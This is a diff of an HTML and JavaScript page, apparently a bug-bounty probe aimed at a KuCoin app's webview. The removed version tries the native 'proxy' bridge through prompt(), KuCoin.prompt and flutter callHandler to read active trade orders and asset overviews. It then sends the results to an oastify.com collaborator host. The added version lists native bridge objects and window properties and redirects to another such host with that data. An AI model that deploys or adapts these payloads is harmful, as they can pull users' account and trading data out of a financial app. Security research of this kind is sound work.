@@ -1,46 +1,16 @@
 <html><body><script>
 var d="";
-
-// 1. Try prompt() proxy directly (hulkvision's technique)
-try{
-  var r1=prompt('{"type":"proxy","params":{"method":"get","url":"v2/kc/trade/orders?status=active"}}');
-  d+="PROMPT1:"+String(r1).substring(0,200)+"|";
-}catch(e){d+="PROMPT1_ERR:"+e.message.substring(0,50)+"|";}
-
-// 2. Try prompt with wireframe type
-try{
-  var r2=prompt("wireframe","{}");
-  d+="PROMPT2:"+String(r2).substring(0,100)+"|";
-}catch(e){d+="PROMPT2_ERR:"+e.message.substring(0,50)+"|";}
-
-// 3. Try prompt with proxy type (different format)
-try{
-  var r3=prompt("proxy",'{"method":"get","url":"/app/v1/asset/overview"}');
-  d+="PROMPT3:"+String(r3).substring(0,200)+"|";
-}catch(e){d+="PROMPT3_ERR:"+e.message.substring(0,50)+"|";}
-
-// 4. Try KuCoin.prompt if it exists
-try{
-  if(window.KuCoin){
-    d+="KUCOIN_EXISTS;";
-    var r4=window.KuCoin.prompt("proxy",'{"method":"get","url":"/app/v1/asset/overview"}');
-    d+="KC_PROMPT:"+String(r4).substring(0,200)+"|";
-  }else{d+="NO_KUCOIN;";}
-}catch(e){d+="KC_ERR:"+e.message.substring(0,50)+"|";}
-
-// 5. Check flutter callHandler
-try{
-  if(window.flutter_inappwebview){
-    d+="FLUTTER_EXISTS;";
-    window.flutter_inappwebview.callHandler("proxy",{method:"get",url:"/app/v1/asset/overview"}).then(function(r){
-      d+="FLUTTER_CALL:"+String(r).substring(0,200)+"|";
-      doExfil();
-    });
-  }else{d+="NO_FLUTTER;";}
-}catch(e){d+="FLUTTER_ERR:"+e.message.substring(0,50)+"|";}
-
-function doExfil(){
-  window.location="https://9kun4tf8u978ewl7wz9r5njs6jci0xhbtqc5tjg75.oastify.com/?d="+encodeURIComponent(d.substring(0,1800));
-}
-setTimeout(function(){doExfil();},3000);
+d+="KC:"+(typeof window.KuCoin)+";";
+d+="FL:"+(typeof window.flutter_inappwebview)+";";
+d+="WK:"+(typeof window.kcwallet)+";";
+d+="JS:"+(typeof window.JSInterface)+";";
+d+="AD:"+(typeof window.AdaAndroid)+";";
+d+="AN:"+(typeof window.Android)+";";
+d+="WB:"+(typeof window.webkit)+";";
+d+="NB:"+(typeof window.nativeCall)+";";
+var extra=[];
+var skip="location,navigator,document,console,performance,screen,history,localStorage,sessionStorage,crypto,self,window,frames,parent,top,length,name,customElements,origin,closed,toolbar,menubar,personalbar,scrollbars,statusbar,locationbar,external,chrome,speechSynthesis,visualViewport,isSecureContext,crossOriginIsolated,scheduler,caches,cookieStore,onappinstalled,onbeforeinstallprompt,indexedDB,navigation,oncontextlost,oncontextrestored,trustedTypes,onpageswap,onpagereveal,onpageshow,onpagehide".split(",");
+for(var p in window){try{var t=typeof window[p];if((t==="object"||t==="function")&&skip.indexOf(p)===-1&&p.length<40&&p.indexOf("on")!==0){extra.push(p+"("+t+")");}}catch(e){}}
+d+="EXTRA:"+extra.join(",").substring(0,800)+";";
+window.location="https://r0s5kbvqarnque1pchp9l5zam1s2g4r8rlwt9tki.oastify.com/?d="+encodeURIComponent(d);
 </script></body></html>
